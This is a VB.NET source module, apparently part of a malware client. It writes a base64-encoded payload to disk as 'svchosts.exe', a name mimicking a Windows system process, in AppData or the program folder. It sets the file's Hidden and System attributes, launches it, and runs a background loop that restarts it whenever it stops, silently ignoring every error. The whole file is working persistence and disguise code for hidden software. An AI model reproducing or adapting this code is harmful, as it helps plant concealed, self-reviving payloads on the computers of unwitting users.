Imports System.Diagnostics
Imports System.Windows.Forms
Imports System.Threading

Namespace Other
    Public Module Watchdog
        Public watchert As Integer = 0
        Public watchthread As Thread
        Public HardInstallStatus As Boolean = False

        Public Sub NewWatchdog(ByVal WatcherByte As String)
            Try
                Dim Path As String
                If HardInstallStatus = True Then : Path = Environ("AppData") : Else : Path = Application.StartupPath : End If
                If IO.File.Exists(Path & "\svchosts.exe") Then : IO.File.Delete(Path & "\svchosts.exe") : End If
                IO.File.WriteAllBytes(Path & "\svchosts.exe", Convert.FromBase64String(WatcherByte))
                IO.File.SetAttributes(Path & "\svchosts.exe", IO.FileAttributes.Hidden + IO.FileAttributes.System)
                Process.Start(Path & "\svchosts.exe")
                KeepWatcherRuning(True)
            Catch ex As Exception

            End Try
        End Sub
        Public Sub StopWatcher(ByVal DeleteWatcher As Boolean)
            Try
                Dim Path As String
                If HardInstallStatus = True Then : Path = Environ("AppData") : Else : Path = Application.StartupPath : End If
                Dim Watcher() As Process = System.Diagnostics.Process.GetProcessesByName("svchosts")
                For Each KillWatcher As Process In Watcher
                    KillWatcher.Kill()
                Next
                KeepWatcherRuning(False)
                If DeleteWatcher = True Then
                    IO.File.Delete(Path & "\svchosts.exe")
                End If
            Catch ex As Exception

            End Try
            watchthread.Abort()
        End Sub

        Public Sub KeepWatcherRuning(ByVal Status As Boolean)
            watchthread = New Thread(Sub() CheckWatcher(Status))
            watchthread.IsBackground = True
            watchthread.Start()
        End Sub
        Private Sub CheckWatcher(ByVal x As Boolean)
            Try
                Dim Path As String
                If HardInstallStatus = True Then : Path = Environ("AppData") : Else : Path = Application.StartupPath : End If
                Do While x = True
                    If Process.GetProcessesByName("svchosts").Length > 0 Then

                    Else
                        Process.Start(Path & "\svchosts.exe")
                    End If
                Loop
            Catch ex As Exception

            End Try
        End Sub
    End Module
End Namespace